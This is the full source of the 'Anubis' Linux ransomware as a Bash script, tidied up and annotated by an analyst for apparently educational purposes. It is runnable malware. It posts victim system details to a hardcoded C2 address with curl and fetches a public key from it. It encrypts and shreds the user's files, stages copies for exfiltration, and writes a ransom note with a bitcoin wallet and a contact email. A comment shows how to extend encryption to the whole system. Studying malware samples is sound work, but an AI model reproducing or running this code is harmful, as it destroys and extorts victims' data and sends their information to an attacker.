#!/bin/bash

# ------------------------------------------------------------------------
#
# Beautified Anubis
#
# This is a beautified and commented version of the the Anubis Linux
# ransomware, with hash:
#
# fc1bb578c99f165e3eb8ac116b1ed42c60171eb83644104142c0294d915c856e
#
# The original sample is a Bash script of 62 lines. It is not obfuscated
# and contain some comments. To distinguish my comments from the original
# ones, the notes that have been added to the beautified version start
# with [jet]
#
# DISCLAIMER:
#
# This program and its source files are only uploaded for educational
# purposes. DO NOT EXECUTE this program on your personal computer or in
# any other machine if you do not understand what it does and what the
# risks are.
#
# ------------------------------------------------------------------------


#
# [jet] Generates a victim identifier by base64 encoding the effective
# [jet] user id (whoami), the full OS name (uname) and the user id (id).
# [jet] This is concatenated with a 12-byte long random sequence and the
# [jet] output is sent to the C2 server. The IP address and port of the C2
# [jet] server is hardcoded in the function.
#
function get_info(){
	info=$(whoami && uname -a && id) 
 	b64=$(echo -n "$info" | base64)
	 # generate a guid for the victim
	guid=$(openssl rand -hex 12)
 	echo "$guid...$b64" > info.txt
	curl --silent -X POST -d @info.txt 192.168.0.27:9002
	shred -f -u -z info.txt	
	# catch it with netcat for testing -- nc -nvvlp 9002 > info.txt
	# this should be the ip address of yout C2 server
}

#
# [jet] Encrypts all txt and png files in the directory passed as first
# [jet] argument. It uses AES-256-CBC and the password generated in the
# [jet] anubis function. Encrypted files are moved to a newly created
# [jet] directory named 'Exfil,' then zipped. Original and encrypted files
# [jet] (except the zip) are then shredded, as well as the password files
# [jet] and the public key file.
#
function encrypt(){
	# using find command to read all the files recursively and encrypt them
	# make a directory to store sensitive files for exfiltration
	mkdir /home/"$USER"/Desktop/Exfil
	chmod 777 /home/"$USER"/Desktop/Exfil
	# encrypt the files and save them to Exfil dir
	find "$1" -name "*.txt" -or -name "*.png" -type f | while read filename; do openssl enc -p -aes-256-cbc -salt -in "$filename" -out "$filename".anubis -pass file:./password;cp "$filename" /home/"$USER"/Desktop/Exfil;shred -f -u -z "$filename"; done
	echo -e "------------------\n------ System encrypted ------\n------------------"
	# make a zip archive
	zip -r Exfil.zip /home/"$USER"/Desktop/Exfil
	echo -e "------------------\n------ Files ready for exfiltration ------\n------------------"
	# again delete the whole directory and leave the zip file
	find /home/"$USER"/Desktop/Exfil -depth -type f -exec shred -v -n 1 -z -u {} \;
	rmdir /home/"$USER"/Desktop/Exfil
	# delete the password used for encryption that was sent to the C2 server
	shred -f -u -z password
	shred -f -u -z pub.pem
	#shred -f -u -z password.b64.enc
	shred -f -u -z password.enc

}


#
# [jet] Retrieves the public key from the C2 server, whose address is
# [jet] hardcoded. Generates a 44-byte long random password which is
# [jet] encrypted with the public key. The encrypted password is sent to
# [jet] the C2 server, though this line is commented out in this version
# [jet] of the sample. It then calls the encrypt function with the folder
# [jet] to encrypt, which in this version is set to a test folder.
#
function anubis(){
	# first we need to get the public key
	#cd /tmp
	curl http://192.168.0.27:9002/public-key.pem -o pub.pem
	# base64 decode the public key stored on the server(optional)
	#base64 -d pub.pem > public.pem
	# generate a password for encryption and then encrypt the password using the public key
	openssl rand -hex 44 | cat > password && openssl rsautl -encrypt -inkey pub.pem -pubin -in password -out password.enc
	base64 password.enc > password.b64.enc
	# exfiltrate the encrypted password
	#curl --silent -X POST -d @password.b64.enc 192.168.0.27:9002
	folder=/home/"$USER"/Ransomware/TestFolder # set this to ~ for full system encryption ( be root )
	encrypt "$folder"
	
}

#
# [jet] Generates a ransom note as a text file in the user desktop. It is
# [jet] a standard basic note with the ransom amount, the bitcoin wallet
# [jet] address and the email of the "customer service.
#
function ransom_txt(){
	# place the ransom note on the users Desktop
	cd /home/"$USER"/Desktop
	touch ransom.txt
	echo -e "We are sorry to inform you that a Ransomware Virus has taken control of your computer.  The important files and folders on your computer have been encrypted with a military grade encryption algorithm. Your documents, videos, images and other forms of data are now inaccessible and completely locked, and cannot be unlocked without the sole decryption key, in which we are the ONLY ones in possession of this key. This key is currently being stored on a remote server. To acquire this key and have all files restored, transfer the amount of 500 USD in the cryptocurrency BITCOIN to the below specified bitcoin wallet address before the time runs out.  Once you have read this you now have 36 hours until your files are lost forever.  If you fail to take action within this time window, the decryption key will be destroyed and access to your files will be permanently lost.  If you are not familiar with cryptocurrency and bitcoin, just do a google search, visit bitcoin.org, go on your mobile to Cash App, or pretty much just ask someone and most likely they can explain it.  Once again, 500 USD in the form of Bitcoin to this wallet address  bc1q8wqyacjzzvrn57d2g7aj35lnr5r8fqv0dn0394     The second the transaction verifies another text file will appear on your desktop with the website to get your key, and the simple instructions on how to use it to get your files back.  36 hours starts now, we suggest you do not waste time.

For any reason you should need customer service, email xeqtr.4@proton.me\n" > ransom.txt

}

#
# [jet] Run the main function (anubis) and then show the ransom note.
# [jet] The get_info function is commented out in the original version,
# [jet] possibly due to its experimental nature.
#
#get_info
anubis
ransom_txt
